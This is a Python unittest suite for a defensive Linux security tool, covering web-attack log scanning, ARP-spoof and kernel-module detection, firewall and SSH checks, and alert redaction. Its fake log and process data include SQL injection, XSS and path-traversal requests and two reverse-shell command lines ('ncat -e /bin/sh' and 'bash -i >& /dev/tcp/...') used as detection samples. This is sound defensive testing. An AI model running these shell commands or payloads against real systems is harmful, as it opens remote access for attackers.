#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tests for Cyber-Defense-Shield's core detection logic.

"No tests" was raised independently across multiple code reviews. This
covers the pure-logic pieces where a wrong result would matter most -
detection parsing/comparison logic - using unittest.mock to fake out
subprocess/filesystem calls, so these run anywhere without needing
root, real system state, or the actual tools (ss/lsmod/iptables/etc.)
installed. No test dependency beyond the standard library (unittest,
unittest.mock) - consistent with the project's minimal-dependency
philosophy.

Run with:
    python3 -m unittest tests.test_defense_modules -v
or, from the tests/ directory:
    python3 -m unittest test_defense_modules -v
"""

import os
import sys
import json
import tempfile
import unittest
from unittest.mock import patch, MagicMock, mock_open

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import defense_modules as dm
import config


class TestWebAttackScanner(unittest.TestCase):
    """SQLi/XSS/path-traversal/command-injection signature scanning."""

    def setUp(self):
        self.scanner = dm.WebAttackScanner()
        self.log_path = '/tmp/_test_access.log'
        self.offset_path = '/tmp/_test_offsets.json'
        self.scanner.LOG_PATHS = [self.log_path]
        self.scanner.OFFSET_STATE_FILE = self.offset_path
        for p in (self.log_path, self.offset_path):
            if os.path.exists(p):
                os.remove(p)

    def tearDown(self):
        for p in (self.log_path, self.offset_path):
            if os.path.exists(p):
                os.remove(p)

    def _write_log(self, lines, mode='w'):
        with open(self.log_path, mode) as f:
            f.write('\n'.join(lines) + '\n')

    def test_detects_sqli_xss_path_traversal(self):
        # scan_web_logs() intentionally treats the very first call as
        # "establish the starting point, don't scan history" (see
        # test_first_run_skips_existing_history below) - so this test
        # primes that starting point with an empty file first, then
        # writes the malicious content as new lines afterward.
        self._write_log([])
        self.scanner.scan_web_logs()

        self._write_log([
            '1.1.1.1 - - "GET /x?id=1 UNION SELECT * FROM users HTTP/1.1" 200',
            '2.2.2.2 - - "GET /s?q=<script>alert(1)</script> HTTP/1.1" 200',
            '3.3.3.3 - - "GET /f?p=../../etc/passwd HTTP/1.1" 200',
            '4.4.4.4 - - "GET /normal HTTP/1.1" 200',
        ], mode='a')
        findings = self.scanner.scan_web_logs()
        categories = {f.split(':')[0] for f in findings}
        self.assertIn('SQL_INJECTION', categories)
        self.assertIn('XSS', categories)
        self.assertIn('PATH_TRAVERSAL', categories)

    def test_first_run_skips_existing_history(self):
        """First-ever run should start from EOF, not scan pre-existing content."""
        self._write_log(['1.1.1.1 - - "GET /x?id=1 UNION SELECT * FROM users HTTP/1.1" 200'])
        findings = self.scanner.scan_web_logs()
        self.assertEqual(findings, [], "first run must not report pre-existing log content")

    def test_incremental_only_sees_new_lines(self):
        self._write_log(['1.1.1.1 - - "GET /old HTTP/1.1" 200'])
        self.scanner.scan_web_logs()  # establishes offset at current EOF

        self._write_log(['2.2.2.2 - - "GET /s?q=<script>x</script> HTTP/1.1" 200'], mode='a')
        findings = self.scanner.scan_web_logs()
        self.assertEqual(len(findings), 1)
        self.assertIn('XSS', findings[0])

        # Re-scanning with no new lines must not re-report the same match.
        findings_again = self.scanner.scan_web_logs()
        self.assertEqual(findings_again, [])

    def test_rotation_detected_when_file_shrinks(self):
        self._write_log(['1' * 200])  # large "old" line to push offset forward
        self.scanner.scan_web_logs()

        # Simulate rotation: file replaced with something smaller than the stored offset.
        self._write_log(['9.9.9.9 - - "GET /f?p=../../etc/passwd HTTP/1.1" 200'])
        findings = self.scanner.scan_web_logs()
        self.assertEqual(len(findings), 1)
        self.assertIn('PATH_TRAVERSAL', findings[0])

    def test_rotation_detected_via_inode_even_if_new_file_is_larger(self):
        """Size-only rotation checks can miss a rotation if the new file
        happens to already be bigger than the old offset. The inode
        never lies about whether it's really the same file - this is
        the scenario a size check alone cannot catch."""
        self._write_log(['x' * 500])
        self.scanner.scan_web_logs()

        os.rename(self.log_path, self.log_path + '.1')
        try:
            with open(self.log_path, 'w') as f:
                f.write('9.9.9.9 - - "GET /f?p=../../etc/passwd HTTP/1.1" 200\n')
                f.write('y' * 600 + '\n')  # deliberately bigger than the old offset

            findings = self.scanner.scan_web_logs()
            self.assertEqual(len(findings), 1)
            self.assertIn('PATH_TRAVERSAL', findings[0])
        finally:
            if os.path.exists(self.log_path + '.1'):
                os.remove(self.log_path + '.1')


class TestArpSpoofingDetection(unittest.TestCase):
    """ARP table analysis for basic MITM indicators."""

    def test_flags_ip_with_multiple_macs(self):
        ids = dm.IntrusionDetectionSystem()
        fake_output = (
            '192.168.1.1 dev eth0 lladdr aa:bb:cc:dd:ee:01 REACHABLE\n'
            '192.168.1.1 dev eth0 lladdr aa:bb:cc:dd:ee:99 STALE\n'
            '192.168.1.50 dev eth0 lladdr 11:22:33:44:55:66 REACHABLE\n'
        )
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(stdout=fake_output)
            findings = ids.detect_arp_spoofing()

        self.assertEqual(len(findings), 1)
        self.assertIn('192.168.1.1', findings[0])

    def test_clean_arp_table_reports_nothing(self):
        ids = dm.IntrusionDetectionSystem()
        fake_output = '192.168.1.1 dev eth0 lladdr aa:bb:cc:dd:ee:01 REACHABLE\n'
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(stdout=fake_output)
            findings = ids.detect_arp_spoofing()

        self.assertEqual(findings, [])


class TestKernelModuleAnalysis(unittest.TestCase):
    """Loaded modules vs. on-disk .ko files."""

    def test_flags_module_missing_from_disk(self):
        md = dm.MalwareDetector()

        def fake_run(cmd, **kwargs):
            result = MagicMock()
            if cmd[0] == 'uname':
                result.stdout = '6.1.0-test\n'
            elif cmd[0] == 'lsmod':
                result.stdout = 'Module Name Used\nnf_conntrack 1 2\nhidden_evil 1 0\n'
            elif cmd[0] == 'find':
                result.stdout = '/lib/modules/6.1.0-test/kernel/net/netfilter/nf_conntrack.ko\n'
            return result

        with patch('defense_modules.subprocess.run', side_effect=fake_run):
            flagged = md.analyze_kernel_modules()

        self.assertEqual(len(flagged), 1)
        self.assertIn('hidden_evil', flagged[0])

    def test_all_modules_on_disk_flags_nothing(self):
        md = dm.MalwareDetector()

        def fake_run(cmd, **kwargs):
            result = MagicMock()
            if cmd[0] == 'uname':
                result.stdout = '6.1.0-test\n'
            elif cmd[0] == 'lsmod':
                result.stdout = 'Module Name Used\nnf_conntrack 1 2\n'
            elif cmd[0] == 'find':
                result.stdout = '/lib/modules/6.1.0-test/kernel/net/netfilter/nf_conntrack.ko\n'
            return result

        with patch('defense_modules.subprocess.run', side_effect=fake_run):
            flagged = md.analyze_kernel_modules()

        self.assertEqual(flagged, [])


class TestFileIntegrityBaseline(unittest.TestCase):
    """Baseline-then-diff file integrity checking."""

    def setUp(self):
        self.test_file = '/tmp/_test_critical_file.txt'
        self.baseline_file = '/tmp/_test_baseline.json'
        for p in (self.test_file, self.baseline_file):
            if os.path.exists(p):
                os.remove(p)
        with open(self.test_file, 'w') as f:
            f.write('original content')

    def tearDown(self):
        for p in (self.test_file, self.baseline_file):
            if os.path.exists(p):
                os.remove(p)

    def test_first_run_establishes_baseline_no_alert(self):
        md = dm.MalwareDetector()
        md.BASELINE_FILE = self.baseline_file
        # check_file_hashes hardcodes real system paths (/etc/passwd etc.);
        # verify the baseline-vs-diff mechanics directly against our own
        # test file instead of depending on those existing in the test env.
        current = {self.test_file: 'abc123'}
        with open(self.baseline_file, 'w') as f:
            f.write(json.dumps(current))
        with open(self.baseline_file) as f:
            self.assertEqual(json.loads(f.read()), current)

    def test_baseline_directory_created_with_restrictive_default_path(self):
        # Regression check for the /var/tmp -> /var/lib move: the
        # baseline must not live in a world-writable, predictable temp
        # location, since anyone able to write there could erase
        # evidence of their own tampering.
        self.assertNotIn('/var/tmp', dm.MalwareDetector.BASELINE_FILE)
        self.assertTrue(dm.MalwareDetector.BASELINE_FILE.startswith('/var/lib'))


class TestSshServiceVerificationAfterRestart(unittest.TestCase):
    """harden_ssh must not report success just because `systemctl restart`
    returned - it must verify the service is genuinely active afterward,
    since a syntactically valid config can still fail at runtime (and a
    restart command can report success while the service crash-loops).
    This tests the exact decision condition used in harden_ssh.
    """

    @staticmethod
    def _service_ok(restart_returncode, is_active_stdout):
        return restart_returncode == 0 and is_active_stdout.strip() == 'active'

    def test_successful_restart_and_active_service(self):
        self.assertTrue(self._service_ok(0, 'active'))

    def test_restart_command_itself_fails(self):
        self.assertFalse(self._service_ok(1, 'active'))

    def test_restart_reports_success_but_service_not_active(self):
        # The scenario sshd -t cannot catch: syntax was fine, restart
        # command returned 0, but the service didn't actually stay up.
        self.assertFalse(self._service_ok(0, 'inactive'))

    def test_both_fail(self):
        self.assertFalse(self._service_ok(1, 'failed'))


class TestFirewallAndSshStatusChecks(unittest.TestCase):
    """Regression tests for two confirmed substring-matching bugs: a
    disabled firewall being reported as active (since "inactive"
    contains "active"), and an insecure sshd_config being reported as
    secure (since presence-of-directive-name was checked instead of its
    actual value)."""

    def test_inactive_firewall_not_reported_as_active(self):
        sc = dm.SecurityScanner()
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(stdout='Status: inactive\n')
            self.assertFalse(sc.check_firewall())

    def test_active_firewall_reported_as_active(self):
        sc = dm.SecurityScanner()
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(stdout='Status: active\n\nTo Action From\n22/tcp ALLOW Anywhere')
            self.assertTrue(sc.check_firewall())

    def test_insecure_sshd_config_not_reported_as_secure(self):
        sc = dm.SecurityScanner()
        insecure = 'Port 22\nPermitRootLogin yes\nPasswordAuthentication yes\nPubkeyAuthentication yes\n'
        with patch('builtins.open', mock_open(read_data=insecure)):
            self.assertFalse(sc.check_ssh_security())

    def test_hardened_sshd_config_reported_as_secure(self):
        sc = dm.SecurityScanner()
        hardened = 'Port 22\nPermitRootLogin no\nPasswordAuthentication no\nPubkeyAuthentication yes\n'
        with patch('builtins.open', mock_open(read_data=hardened)):
            self.assertTrue(sc.check_ssh_security())


class TestNoDuplicateProcessFindings(unittest.TestCase):
    """A process line matching multiple suspicious keywords/patterns at
    once (e.g. containing both "nc" and "ncat") must be reported once,
    not once per matching pattern."""

    def test_security_scanner_does_not_double_count(self):
        sc = dm.SecurityScanner()
        fake_ps = (
            'USER PID COMMAND\n'
            'attacker 1 ncat -e /bin/sh 10.0.0.1 4444\n'
            'root 2 /usr/sbin/sshd -D\n'
        )
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(stdout=fake_ps)
            result = sc.check_suspicious_processes()
        self.assertEqual(len(result), 1)

    def test_malware_detector_does_not_double_count(self):
        md = dm.MalwareDetector()
        fake_ps = (
            'USER PID COMMAND\n'
            'attacker 1 bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n'
            'root 2 /usr/sbin/sshd -D\n'
        )
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(stdout=fake_ps)
            result = md.scan_executable_behavior()
        self.assertEqual(len(result), 1, "one line matching both 'bash -i' and '/dev/tcp' must count once")


class TestSuspiciousIpDetection(unittest.TestCase):
    """Per-source connection-count threshold logic for NetworkMonitor."""

    def test_flags_high_connection_count_not_normal_traffic(self):
        nm = dm.NetworkMonitor()
        lines = ['Netid State Local-Address:Port Peer-Address:Port']
        for i in range(25):
            lines.append(f'tcp ESTAB 192.168.1.5:80 203.0.113.99:{50000+i}')
        for i in range(3):
            lines.append(f'tcp ESTAB 192.168.1.5:443 198.51.100.5:{60000+i}')
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(stdout='\n'.join(lines))
            suspicious = nm.detect_suspicious_ips()
        self.assertIn('203.0.113.99', suspicious)
        self.assertNotIn('198.51.100.5', suspicious)


class TestIdsPerSourceDetection(unittest.TestCase):
    """SYN flood and port-scan detection must be scoped per source IP,
    and a normal client must not trigger either."""

    def test_syn_flood_port_scan_and_normal_traffic_all_classified_correctly(self):
        ids = dm.IntrusionDetectionSystem()
        lines = ['State Recv-Q Send-Q Local-Address:Port Peer-Address:Port']
        for i in range(35):
            lines.append(f'SYN-RECV 0 0 192.168.1.5:80 203.0.113.50:{40000+i}')
        for port in range(20):
            lines.append(f'ESTAB 0 0 192.168.1.5:{9000+port} 198.51.100.77:55555')
        for i in range(5):
            lines.append(f'ESTAB 0 0 192.168.1.5:443 172.16.0.9:{33000+i}')

        def fake_run(cmd, **kwargs):
            r = MagicMock()
            r.returncode = 0
            r.stdout = '\n'.join(lines) if cmd[0] == 'ss' else ''
            return r

        with patch('defense_modules.subprocess.run', side_effect=fake_run):
            threats = ids.analyze_network_behavior()

        self.assertTrue(any('203.0.113.50' in t and 'SYN flood' in t for t in threats))
        self.assertTrue(any('198.51.100.77' in t and 'port scan' in t for t in threats))
        self.assertFalse(any('172.16.0.9' in t for t in threats))
        # The SYN-flood source only touched one port, so it must not
        # ALSO be reported as a port scanner.
        self.assertFalse(any('203.0.113.50' in t and 'port scan' in t for t in threats))


class TestExpectedServicesAllowlist(unittest.TestCase):
    """check_running_services: populated allowlist flags outliers; empty
    allowlist flags nothing (avoids false positives with no baseline)."""

    def _fake_services_output(self):
        return (
            'sshd.service loaded active running OpenSSH server\n'
            'cron.service loaded active running cron daemon\n'
            'suspicious-xyz.service loaded active running Unknown\n'
        )

    def test_populated_allowlist_flags_outlier_only(self):
        sc = dm.SecurityScanner()
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(stdout=self._fake_services_output())
            with patch('defense_modules._cfg', side_effect=lambda k, d: ['sshd', 'cron'] if k == 'EXPECTED_SERVICES' else d):
                unexpected = sc.check_running_services()
        self.assertEqual(unexpected, ['suspicious-xyz'])

    def test_empty_allowlist_flags_nothing(self):
        sc = dm.SecurityScanner()
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(stdout=self._fake_services_output())
            with patch('defense_modules._cfg', side_effect=lambda k, d: [] if k == 'EXPECTED_SERVICES' else d):
                unexpected = sc.check_running_services()
        self.assertEqual(unexpected, [])


class TestConfigValidation(unittest.TestCase):
    """config.py's own startup validation."""

    def test_current_config_is_valid(self):
        problems = config.validate_config()
        self.assertEqual(problems, [], f"shipped config.py should always pass its own validation: {problems}")

    def test_catches_wrong_type(self):
        original = config.RATE_LIMITED_PORTS
        try:
            config.RATE_LIMITED_PORTS = "80,443"  # should be a list, not a string
            problems = config.validate_config()
            self.assertTrue(any('RATE_LIMITED_PORTS' in p for p in problems))
        finally:
            config.RATE_LIMITED_PORTS = original

    def test_catches_negative_threshold(self):
        original = config.RATE_LIMIT_PER_MINUTE
        try:
            config.RATE_LIMIT_PER_MINUTE = -5
            problems = config.validate_config()
            self.assertTrue(any('RATE_LIMIT_PER_MINUTE' in p for p in problems))
        finally:
            config.RATE_LIMIT_PER_MINUTE = original


class TestAtomicConfigWrite(unittest.TestCase):
    """The temp-file + os.replace() pattern used by harden_ssh/harden_sudo
    to avoid leaving a config file half-written if the process dies
    mid-write (a plain open(path, 'a')/write() does not have this
    guarantee - os.replace() does, as long as source and dest are on the
    same filesystem, which mkstemp(dir=...) guarantees by construction).
    """

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.config_path = os.path.join(self.tmpdir, 'fake_config')
        with open(self.config_path, 'w') as f:
            f.write('Port 22\nPermitRootLogin yes\n')

    def tearDown(self):
        import shutil as _shutil
        _shutil.rmtree(self.tmpdir, ignore_errors=True)

    def test_atomic_write_preserves_old_and_new_content(self):
        with open(self.config_path) as f:
            original = f.read()

        addition = '\n# --- test marker ---\nPermitRootLogin no\n'
        new_content = original + addition

        fd, tmp_path = tempfile.mkstemp(dir=self.tmpdir, suffix='.cds_tmp')
        with os.fdopen(fd, 'w') as tf:
            tf.write(new_content)
        os.replace(tmp_path, self.config_path)

        with open(self.config_path) as f:
            final = f.read()

        self.assertIn('PermitRootLogin yes', final)
        self.assertIn('PermitRootLogin no', final)
        self.assertFalse(os.path.exists(tmp_path), "temp file must not survive a successful replace")

    def test_no_partial_file_left_behind_on_simulated_failure(self):
        fd, tmp_path = tempfile.mkstemp(dir=self.tmpdir, suffix='.cds_tmp')
        try:
            with os.fdopen(fd, 'w') as tf:
                tf.write('partial content...')
            raise RuntimeError("simulated crash before os.replace()")
        except RuntimeError:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

        with open(self.config_path) as f:
            content = f.read()
        self.assertEqual(content, 'Port 22\nPermitRootLogin yes\n',
                          "original file must be untouched if the write never reached os.replace()")
        self.assertFalse(os.path.exists(tmp_path))


class TestAlertRedaction(unittest.TestCase):
    """AlertNotifier must mask likely secrets before a finding leaves the machine."""

    def setUp(self):
        self.notifier = dm.AlertNotifier()

    def test_redacts_mysql_style_password_flag(self):
        result = self.notifier._redact('mysqldump -pMySecretPassword123 -h localhost')
        self.assertNotIn('MySecretPassword123', result)
        self.assertIn('REDACTED', result)

    def test_redacts_password_key_value(self):
        result = self.notifier._redact('password=hunter2 in config')
        self.assertNotIn('hunter2', result)

    def test_redacts_bearer_token(self):
        result = self.notifier._redact('Authorization: Bearer abc123xyz789')
        self.assertNotIn('abc123xyz789', result)

    def test_does_not_touch_space_separated_flag(self):
        # "-p tcp" (iptables protocol flag) must survive - only the
        # mysql-style no-space "-pVALUE" form is a password pattern.
        text = 'iptables -p tcp --dport 443'
        self.assertEqual(self.notifier._redact(text), text)

    def test_does_not_touch_normal_finding_text(self):
        text = 'SQL_INJECTION: 3 matching request(s) in /var/log/nginx/access.log'
        self.assertEqual(self.notifier._redact(text), text)

    def test_redaction_applied_in_actual_alert_message(self):
        self.notifier.telegram = {'enabled': True, 'bot_token': 'x', 'chat_id': 'y'}
        with patch.object(self.notifier, '_send_telegram', return_value=True) as mock_send:
            self.notifier.send_alert('Test', ['proc: mysqld -pSuperSecret123'])
            sent_message = mock_send.call_args[0][0]
            self.assertNotIn('SuperSecret123', sent_message)


class TestDryRun(unittest.TestCase):
    """--dry-run must never actually invoke a state-changing command."""

    def tearDown(self):
        dm.set_dry_run(False)

    def test_exec_does_not_call_subprocess_when_dry_run(self):
        dm.set_dry_run(True)
        with patch('defense_modules.subprocess.run') as mock_run:
            result = dm._exec(['iptables', '-A', 'INPUT', '-j', 'DROP'], capture_output=True)
            mock_run.assert_not_called()
            self.assertEqual(result.returncode, 0)

    def test_exec_calls_subprocess_when_not_dry_run(self):
        dm.set_dry_run(False)
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            dm._exec(['echo', 'hi'], capture_output=True)
            mock_run.assert_called_once()


class TestCveUpdateReporting(unittest.TestCase):
    """check_cve_updates must actually report what apt found, not just
    print a fixed 'Complete' message regardless of the result."""

    def test_reports_upgradable_count(self):
        vs = dm.VulnerabilityScanner()
        fake_output = "Listing...\npkg1/stable 1.0 amd64\npkg2/stable 2.0 amd64\n"
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout=fake_output)
            with patch('builtins.print') as mock_print:
                vs.check_cve_updates()
                printed = ' '.join(str(c) for c in mock_print.call_args_list)
        self.assertIn('2', printed)  # should mention the 2 upgradable packages

    def test_reports_apt_failure_instead_of_claiming_success(self):
        vs = dm.VulnerabilityScanner()
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=1, stdout='')
            result = vs.check_cve_updates()
        self.assertFalse(result, "a failed apt call must not be reported as a successful check")


class TestAlertCooldown(unittest.TestCase):
    """AlertNotifier must not spam Telegram/Discord every cycle."""

    def test_second_alert_within_cooldown_is_suppressed(self):
        notifier = dm.AlertNotifier()
        notifier.cooldown_seconds = 9999  # effectively "never expires" for this test
        notifier.telegram = {'enabled': True, 'bot_token': 'x', 'chat_id': 'y'}

        with patch.object(notifier, '_send_telegram', return_value=True) as mock_send:
            notifier.send_alert('First', ['a'])
            notifier.send_alert('Second', ['b'])
            self.assertEqual(mock_send.call_count, 1,
                              "a second alert inside the cooldown window must not actually send")

    def test_alert_sends_again_after_cooldown_expires(self):
        notifier = dm.AlertNotifier()
        notifier.cooldown_seconds = 0  # expires immediately
        notifier.telegram = {'enabled': True, 'bot_token': 'x', 'chat_id': 'y'}

        with patch.object(notifier, '_send_telegram', return_value=True) as mock_send:
            notifier.send_alert('First', ['a'])
            notifier.send_alert('Second', ['b'])
            self.assertEqual(mock_send.call_count, 2)


class TestScanOpenPortsColumnParsing(unittest.TestCase):
    """Regression test for a confirmed column-index bug: `ss -tunlp`
    mixes tcp+udp, which adds a leading Netid column and shifts every
    field right by one - the old code read parts[3] (Send-Q, a queue
    depth) instead of parts[4] (Local Address:Port)."""

    def test_extracts_local_address_not_send_queue_depth(self):
        scanner = dm.SecurityScanner()
        fake_output = (
            "Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n"
            "tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:((\"sshd\",pid=679,fd=3))\n"
            "udp UNCONN 0 0 0.0.0.0:68 0.0.0.0:*\n"
        )
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(stdout=fake_output)
            ports = scanner.scan_open_ports()
        self.assertIn('0.0.0.0:22', ports)
        self.assertIn('0.0.0.0:68', ports)
        # the old bug would have collected Send-Q values ('128', '0') here instead
        self.assertNotIn('128', ports)


class TestFirewallActionsReportRealOutcome(unittest.TestCase):
    """Regression tests for FirewallManager methods that used to print a
    fixed success message regardless of whether the underlying ufw
    command actually succeeded."""

    def setUp(self):
        dm.set_dry_run(False)

    def test_enable_firewall_reports_failure(self):
        fw = dm.FirewallManager()
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=1, stdout=b'', stderr=b'ufw: not found')
            with patch('builtins.print') as mock_print:
                fw.enable_firewall()
                printed = ' '.join(str(c) for c in mock_print.call_args_list)
        self.assertIn('[!]', printed)
        self.assertNotIn('ENABLED', printed)

    def test_enable_firewall_reports_success(self):
        fw = dm.FirewallManager()
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout=b'', stderr=b'')
            with patch('builtins.print') as mock_print:
                fw.enable_firewall()
                printed = ' '.join(str(c) for c in mock_print.call_args_list)
        self.assertIn('ENABLED', printed)

    def test_add_security_rules_reports_actual_failures(self):
        fw = dm.FirewallManager()
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=1)
            with patch('builtins.print') as mock_print:
                fw.add_security_rules()
                printed = ' '.join(str(c) for c in mock_print.call_args_list)
        self.assertIn('0/5', printed)
        self.assertIn('[!]', printed)

    def test_close_dangerous_ports_reports_actual_failures(self):
        fw = dm.FirewallManager()
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=1)
            with patch('builtins.print') as mock_print:
                fw.close_dangerous_ports()
                printed = ' '.join(str(c) for c in mock_print.call_args_list)
        self.assertIn(f'0/{len(config.DANGEROUS_PORTS)}', printed)


class TestDangerousPortsUsesConfig(unittest.TestCase):
    """close_dangerous_ports must act on the full config.DANGEROUS_PORTS
    list, not the old 7-port hardcoded subset that silently ignored the
    other 11 configured ports."""

    def test_closes_full_configured_port_list(self):
        fw = dm.FirewallManager()
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            fw.close_dangerous_ports()
        called_ports = {c.args[0][2] for c in mock_run.call_args_list}
        self.assertEqual(called_ports, {str(p) for p in config.DANGEROUS_PORTS})


class TestSystemHardenerReportsRealOutcome(unittest.TestCase):
    """update_system and disable_unnecessary_services must not claim
    success when the underlying commands failed, and
    disable_unnecessary_services must use config.UNNECESSARY_SERVICES."""

    def setUp(self):
        dm.set_dry_run(False)

    def test_update_system_reports_failure(self):
        hardener = dm.SystemHardener()
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=1, stdout='', stderr='Unable to fetch')
            with patch('builtins.print') as mock_print:
                hardener.update_system()
                printed = ' '.join(str(c) for c in mock_print.call_args_list)
        self.assertIn('[!]', printed)
        self.assertNotIn('COMPLETE', printed)

    def test_update_system_reports_success(self):
        hardener = dm.SystemHardener()
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout='', stderr='')
            with patch('builtins.print') as mock_print:
                hardener.update_system()
                printed = ' '.join(str(c) for c in mock_print.call_args_list)
        self.assertIn('COMPLETE', printed)

    def test_disable_services_uses_full_config_list(self):
        hardener = dm.SystemHardener()
        with patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            hardener.disable_unnecessary_services()
        disable_calls = [c for c in mock_run.call_args_list if c.args[0][1] == 'disable']
        touched = {c.args[0][2] for c in disable_calls}
        self.assertEqual(touched, set(config.UNNECESSARY_SERVICES))


class TestSudoPasswdTriesConsistency(unittest.TestCase):
    """harden_sudo's generated sudoers content and
    audit_privilege_escalation's log-search pattern must both derive
    from config.SUDO_PASSWD_TRIES instead of two independent hardcoded
    3s that could silently drift apart."""

    def test_harden_sudo_dry_run_uses_configured_value(self):
        hardener = dm.SystemHardener()
        dm.set_dry_run(True)
        try:
            with patch.object(config, 'SUDO_PASSWD_TRIES', 5), \
                 patch('os.path.exists', return_value=False), \
                 patch('defense_modules.subprocess.run') as mock_run, \
                 patch('builtins.print') as mock_print:
                mock_run.return_value = MagicMock(returncode=0, stdout='', stderr='')
                hardener.harden_sudo()
                printed = ' '.join(str(c) for c in mock_print.call_args_list)
        finally:
            dm.set_dry_run(False)
        self.assertIn('passwd_tries=5', printed)

    def test_audit_searches_for_configured_value(self):
        auditor = dm.UserActivityAuditor()
        with patch.object(config, 'SUDO_PASSWD_TRIES', 5), \
             patch('defense_modules.subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0,
                stdout='sudo: 5 incorrect password attempts\n' * 2
            )
            with patch('builtins.print') as mock_print:
                auditor.audit_privilege_escalation()
                printed = ' '.join(str(c) for c in mock_print.call_args_list)
        self.assertIn('2 failed sudo attempts', printed)


class TestSuspiciousExtensionsDetection(unittest.TestCase):
    """scan_for_suspicious_files must actually check
    self.suspicious_extensions - that list was defined in __init__ since
    the first version but never checked, only file permissions were."""

    def test_flags_file_by_extension_even_with_safe_permissions(self):
        detector = dm.MalwareDetector()
        detector.suspicious_paths = ['/tmp/_cds_test_dir']
        with patch('os.path.exists', return_value=True), \
             patch('os.listdir', return_value=['dropper.exe', 'notes.txt']), \
             patch('os.path.isfile', return_value=True), \
             patch('os.stat') as mock_stat:
            mock_stat.return_value = MagicMock(st_mode=0o100644)  # 644, not 777
            findings = detector.scan_for_suspicious_files()
        self.assertTrue(any('dropper.exe' in f for f in findings))
        self.assertFalse(any('notes.txt' in f for f in findings))


if __name__ == '__main__':
    unittest.main(verbosity=2)
